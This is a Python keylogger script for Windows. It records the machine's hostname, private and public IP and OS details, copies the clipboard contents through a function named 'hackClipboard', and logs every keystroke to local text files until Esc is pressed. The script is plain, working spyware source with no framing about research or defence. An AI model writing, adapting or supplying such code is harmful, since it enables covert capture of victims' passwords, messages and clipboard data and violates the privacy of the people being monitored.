
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
from requests import get

keysInfo = "key_log.txt"
systemInfo = "system_info.txt"
clipboardInfo = "clipboard_info.txt"


def aboutSystem():
    with open(systemInfo, "w") as f:
        HOSTNAME = socket.gethostname()
        IP = socket.gethostbyname(HOSTNAME)

        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + publicIP)
        except:
            f.write("[ERROR]: Failed to fetch Public IP.")
        
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + HOSTNAME + "\n")
        f.write("Private IP Address: " + IP + "\n")


def hackClipboard():
    with open(clipboardInfo, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write(f"[Time: {time.time()}]: \n" + pastedData)
        except:
            f.write("[ERROR]: Failed to fetch clipboard contents.")

aboutSystem()
print("[LOG]: System Info Logged")

hackClipboard()
print("[LOG]: ClipBoard Info Logged")

print(f"[LOG [{time.time()}]]: KeyLogger Active.")

with open(keysInfo, "a") as f:
    f.write(f"[LOG [{time.time()}]]: KeyLogger Active.\n")
    f.write(f"[{time.time()}]\n")
    f.write("[LOG]: System Info Logged\n")
    f.write("[LOG]: ClipBoard Info Logged\n")


while True:
    count = 0
    keys = []

    def onPress(key):
        global keys, count, currentTime
        print(f"{key} pressed")
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeLog(keys)
            keys = []
    
    def writeLog(keys):
        with open(keysInfo, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                if key == Key.enter:
                    f.write("\n")
                if key == Key.esc:
                    print("[LOG]: KeyLogger Closed.")   
                    exit()
                if k.find("Key") == -1:
                    f.write(k)
                f.close()
    
    def onRelease(key):
        if key == Key.esc:
            return False
        
    with Listener(on_press = onPress, on_release = onRelease) as listener:
        listener.join()
